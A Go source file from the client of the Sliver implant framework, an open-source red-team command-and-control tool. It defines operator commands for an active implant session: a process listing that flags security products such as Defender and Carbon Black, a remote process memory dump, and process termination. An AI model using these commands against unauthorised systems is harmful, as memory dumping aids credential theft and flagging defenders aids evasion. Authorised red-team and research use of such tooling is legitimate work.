package sliver

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"
	"path"
	"strings"

	"github.com/maxlandon/readline"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	// Stylizes known processes in the `ps` command
	knownProcs = map[string]string{
		"ccSvcHst.exe":    red, // SEP
		"cb.exe":          red, // Carbon Black
		"MsMpEng.exe":     red, // Windows Defender
		"smartscreen.exe": red, // Windows Defender Smart Screen
	}
)

// PS - List session host processes.
type PS struct {
	Options struct {
		PID   int32  `long:"pid" short:"p" description:"process ID" default:"-1"`
		Exe   string `long:"exe" short:"e" description:"string pattern in executable name"`
		Owner string `long:"owner" short:"o" description:"user-owned processes"`
	} `group:"process filters"`
}

// Execute - List session host processes.
func (p *PS) Execute(args []string) (err error) {

	pidFilter := p.Options.PID
	exeFilter := p.Options.Exe
	ownerFilter := p.Options.Owner

	ps, err := transport.RPC.Ps(context.Background(), &sliverpb.PsReq{
		Request: core.ActiveSessionRequest(),
	})
	if err != nil {
		fmt.Printf(util.Error+"%s\n", err)
		return
	}

	table := util.NewTable("")
	headers := []string{"PID", "PPID", "Executable", "owner"}
	headLen := []int{0, 0, 10, 0}
	table.SetColumns(headers, headLen)

	for _, proc := range ps.Processes {
		var lineColor = ""

		if pidFilter != -1 && proc.Pid == pidFilter {
			lineColor = printProcInfo(proc, core.ActiveSession.Session)
		}
		if exeFilter != "" && strings.HasPrefix(proc.Executable, exeFilter) {
			lineColor = printProcInfo(proc, core.ActiveSession.Session)
		}
		if ownerFilter != "" && strings.HasPrefix(proc.Owner, ownerFilter) {
			lineColor = printProcInfo(proc, core.ActiveSession.Session)
		}
		if pidFilter == -1 && exeFilter == "" && ownerFilter == "" {
			lineColor = printProcInfo(proc, core.ActiveSession.Session)
		}

		pid := fmt.Sprintf("%s%d%s", lineColor, proc.Pid, readline.RESET)
		ppid := fmt.Sprintf("%s%d%s", lineColor, proc.Ppid, readline.RESET)
		exe := fmt.Sprintf("%s%s%s", lineColor, proc.Executable, readline.RESET)
		owner := fmt.Sprintf("%s%s%s", lineColor, proc.Owner, readline.RESET)

		table.AppendRow([]string{pid, ppid, exe, owner})
	}
	table.Output()

	return
}

// printProcInfo - Stylizes the process information
func printProcInfo(proc *commonpb.Process, session *clientpb.Session) string {
	color := normal
	if modifyColor, ok := knownProcs[proc.Executable]; ok {
		color = modifyColor
	}
	if session != nil && proc.Pid == session.PID {
		color = readline.GREEN
	}
	return color
}

// ProcDump - Dump process memory
type ProcDump struct {
	Positional struct {
		PID int32 `description:"process ID to dump memory from"`
	} `positional-args:"yes"`
	Options struct {
		Name string `long:"name" short:"n" description:"target process name"`
	} `group:"process filters"`
}

// Execute - Dump process memory
func (p *ProcDump) Execute(args []string) (err error) {

	pid := p.Positional.PID
	name := p.Options.Name

	if pid == 0 && name != "" {
		pid = getPIDByName(name, core.ActiveSession.Session)
	}
	if pid == -1 {
		fmt.Printf(util.Error + "Invalid process target\n")
		return
	}

	ctrl := make(chan bool)
	go spin.Until("Dumping remote process memory ...", ctrl)
	dump, err := transport.RPC.ProcessDump(context.Background(), &sliverpb.ProcessDumpReq{
		Pid:     pid,
		Timeout: int32(core.SessionRequest(core.ActiveSession.Session).Timeout),
		Request: core.ActiveSessionRequest(),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(util.Error+"Error %s", err)
		return
	}

	hostname := core.ActiveSession.Hostname
	tmpFileName := path.Base(fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
	tmpFile, err := ioutil.TempFile("", tmpFileName)
	if err != nil {
		fmt.Printf(util.Error+"Error creating temporary file: %v\n", err)
		return
	}
	tmpFile.Write(dump.GetData())
	fmt.Printf(util.Info+"Process dump stored in: %s\n", tmpFile.Name())

	return
}

func getPIDByName(name string, sess *clientpb.Session) int32 {
	ps, err := transport.RPC.Ps(context.Background(), &sliverpb.PsReq{
		Request: core.ActiveSessionRequest(),
	})
	if err != nil {
		return -1
	}
	for _, proc := range ps.Processes {
		if proc.Executable == name {
			return proc.Pid
		}
	}
	return -1
}

// Terminate - Terminate one or more processes runing on the host.
type Terminate struct {
	Positional struct {
		PID []int32 `description:"process ID to dump memory from" required:"1"`
	} `positional-args:"yes" required:"yes"`
	Options struct {
		Force bool `long:"force" short:"f" description:"disregard safety and kill the PID"`
	} `group:"kill options"`
}

// Execute - Terminate one or more processes runing on the host.
func (t *Terminate) Execute(args []string) (err error) {

	// For each process ID send a request to kill.
	for _, pid := range t.Positional.PID {
		terminated, err := transport.RPC.Terminate(context.Background(), &sliverpb.TerminateReq{
			Pid:     int32(pid),
			Force:   t.Options.Force,
			Request: core.ActiveSessionRequest(),
		})
		if err != nil {
			fmt.Printf(util.Error+"%s\n", err)
		} else {
			fmt.Printf(util.Info+"Process %d has been terminated\n", terminated.Pid)
		}
	}
	return
}
